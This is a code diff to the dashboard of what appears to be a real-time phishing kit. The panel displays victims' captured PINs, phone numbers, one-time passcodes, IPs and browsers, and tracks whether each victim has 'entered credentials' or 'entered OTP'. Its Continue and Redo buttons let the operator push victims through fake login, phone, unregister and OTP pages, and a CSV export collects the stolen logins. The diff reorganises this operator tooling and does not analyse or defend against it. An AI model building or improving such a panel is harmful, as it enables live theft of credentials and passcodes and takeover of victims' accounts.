@@ -66,7 +66,11 @@
     <div class="grid stats">
       <div class="card"><div class="stat-label">Active Sessions</div><div class="stat-value" id="active">—</div></div>
       <div class="card"><div class="stat-label">Visits (total)</div><div class="stat-value" id="total">—</div></div>
-      <div class="card"><div class="stat-label">Successful Logins</div><div class="stat-value" id="success">—</div></div>
+      <div class="card">
+        <div class="stat-label">Successful Logins</div>
+        <div class="stat-value" id="success">—</div>
+        <button id="exportBtn" class="btn" style="margin-top:12px;width:100%;font-size:12px">Export CSV</button>
+      </div>
     </div>
 
     <div class="card" style="margin-top:22px">
@@ -75,14 +79,6 @@
         <th>#</th><th>Client</th><th>PIN</th><th>Phone</th><th>OTP</th><th>IP</th><th>Platform</th><th>Browser</th><th>Status</th><th>Actions</th>
       </tr></thead><tbody></tbody></table>
       <div id="empty">No active sessions</div>
-    </div>
-
-    <div class="card" style="margin-top:22px">
-      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
-        <div style="font-size:14px;font-weight:600">Successful Logins</div>
-        <button id="exportBtn" class="btn" style="font-size:12px">Export CSV</button>
-      </div>
-      <div id="successList"></div>
     </div>
   </div>
 
@@ -101,19 +97,8 @@
 
   <script>
     let currentSid = null, jsonData = {}, lastSessions = new Map();
-
-    /* ----------  SMALL HELPERS  ---------- */
     const qs = s => document.querySelector(s);
     const fmt = t => new Date(t).toLocaleTimeString();
-    function pageTitle(f){
-      switch(f){
-        case 'index.html': return 'LOGIN';
-        case 'verify.html': return 'PHONE';
-        case 'unregister.html': return 'UNREGISTER';
-        case 'otp.html': return 'OTP';
-        default: return f;
-      }
-    }
 
     /* ----------  LIVE CLOCK  ---------- */
     function updateClock(){
@@ -139,7 +124,39 @@
       setTimeout(() => alert.remove(), 5000);
     }
 
-    /* ----------  DETECT CHANGES  ---------- */
+    /* ----------  STATUS TEXT  ---------- */
+    function statusText(s){
+      if (s.page==='success') return '<div style="color:var(--green)">APPROVED</div>';
+      if (s.entered) return '<div style="font-size:11px;color:var(--green)">ENTERED CREDENTIALS</div>';
+      if (s.phone) return '<div style="font-size:11px;color:var(--blue)">ENTERED PHONE</div>';
+      if (s.unregisterClicked) return '<div style="font-size:11px;color:var(--yellow)">CLICKED UNREGISTER</div>';
+      if (s.otp) return '<div style="font-size:11px;color:var(--green)">ENTERED OTP</div>';
+      return '<div style="font-size:11px;color:var(--text-muted)">WAITING</div>';
+    }
+
+    /* ----------  ACTION BUTTONS (conditional)  ---------- */
+    function actionButtons(s){
+      let html = '<div style="display:flex;gap:6px">';
+      html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg"></button>`;
+      /* -----  UNREGISTER page  ----- */
+      if (s.page==='unregister.html'){
+        if (s.unregisterClicked) html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+        return html + '</div>';
+      }
+      /* -----  OTP page  ----- */
+      if (s.page==='otp.html'){
+        if (s.otp) html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+        return html + '</div>';
+      }
+      /* -----  Other pages  ----- */
+      if (s.entered||s.phone) {
+        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+        html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
+      }
+      return html + '</div>';
+    }
+
+    /* ----------  CHANGE DETECTION  ---------- */
     function checkChanges(newSessions){
       newSessions.forEach(s => {
         const old = lastSessions.get(s.sid);
@@ -158,6 +175,15 @@
     }
 
     /* ----------  RENDER  ---------- */
+    function pageTitle(f){
+      switch(f){
+        case 'index.html': return 'LOGIN';
+        case 'verify.html': return 'PHONE';
+        case 'unregister.html': return 'UNREGISTER';
+        case 'otp.html': return 'OTP';
+        default: return f;
+      }
+    }
     function render(d){
       qs('#userName').textContent = d.username;
       qs('#active').textContent   = d.active;
@@ -180,18 +206,12 @@
           <td>${s.ip}</td>
           <td>${s.platform}</td>
           <td>${s.browser}</td>
-          <td>${pageTitle(s.page)}</td>
-          <td>
-            <div style="display:flex;gap:6px">
-              <button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg"></button>
-              ${(s.entered||s.phone||s.otp||s.unregisterClicked)?`<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`:''}
-              ${(s.entered||s.phone||s.otp)?`<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`:''}
-            </div>
-          </td>
+          <td><div style="font-weight:600">${pageTitle(s.page)}</div>${statusText(s)}</td>
+          <td>${actionButtons(s)}</td>
         </tr>`).join('');
     }
 
-    /* ----------  DETAIL MODAL  ---------- */
+    /* ----------  MODAL  ---------- */
     function showDetail(sid){
       const s = jsonData.sessions.find(x=>x.sid===sid);
       if(!s)return;
@@ -219,13 +239,11 @@
       load();
     }
 
-    /* ----------  LOGOUT  ---------- */
+    /* ----------  LOGOUT + EXPORT  ---------- */
     qs('#logoutBtn').onclick = async () => {
       await fetch('/panel/logout',{method:'POST'});
       location.replace('/panel');
     };
-
-    /* ----------  CSV EXPORT  ---------- */
     qs('#exportBtn').onclick = () => location.href = '/api/export';
 
     /* ----------  LONG-POLL  ---------- */
